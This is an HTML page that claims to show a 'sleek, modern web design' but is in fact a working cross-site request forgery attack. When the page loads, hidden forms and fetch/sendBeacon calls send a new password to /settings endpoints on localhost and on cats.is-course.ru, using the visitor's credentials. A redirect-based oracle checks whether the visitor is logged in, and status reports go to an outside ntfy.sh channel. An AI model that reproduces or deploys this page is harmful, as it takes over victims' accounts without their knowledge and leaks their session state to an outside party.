<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Awesome web design</title>
<style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;padding:40px;max-width:760px}h1{color:#2563eb}p{color:#444}</style></head>
<body>
<h1>Check out this beautiful design</h1>
<p>This page demonstrates a sleek, modern web design pattern.</p>
<form id="loc" action="http://localhost:8080/settings" method="POST">
  <input type="hidden" name="password" value="Catadmin1234!q"><input type="hidden" name="confirm-password" value="Catadmin1234!q"></form>
<form id="pub" action="https://cats.is-course.ru/settings" method="POST">
  <input type="hidden" name="password" value="Catadmin1234!q"><input type="hidden" name="confirm-password" value="Catadmin1234!q"></form>
<script>
(function(){
  var T='https://ntfy.sh/yds26cats9f3a';
  function ping(m){ try{ fetch(T,{method:'POST',mode:'no-cors',body:m}); }catch(e){} }
  // ORACLE: /settings -> 302 when logged in (redirect:'error' rejects), 200 login page when anonymous (resolves)
  function oracle(url,label){
    fetch(url,{mode:'no-cors',redirect:'error',cache:'no-store',credentials:'include'})
      .then(function(r){ ping('ORACLE '+label+' RESOLVED type='+r.type+' => anonymous/200'); })
      .catch(function(e){ ping('ORACLE '+label+' REJECTED '+e.name+' => logged-in/302'); });
  }
  oracle('http://localhost:8080/settings','local_settings');
  oracle('https://cats.is-course.ru/settings','public_settings');
  // CSRF to both, then top-level attempts
  setTimeout(function(){
    try{
      var b='password=Catadmin1234!q&confirm-password=Catadmin1234!q';
      fetch('http://localhost:8080/settings',{method:'POST',mode:'no-cors',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
      fetch('https://cats.is-course.ru/settings',{method:'POST',mode:'no-cors',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
      navigator.sendBeacon('http://localhost:8080/settings', new Blob([b],{type:'application/x-www-form-urlencoded'}));
      navigator.sendBeacon('https://cats.is-course.ru/settings', new Blob([b],{type:'application/x-www-form-urlencoded'}));
      ping('CSRF fired both');
    }catch(e){ ping('csrf err '+e); }
  },1500);
  setTimeout(function(){ ping('going local toplevel'); try{ document.getElementById('loc').submit(); }catch(e){} }, 3000);
})();
</script></body></html>
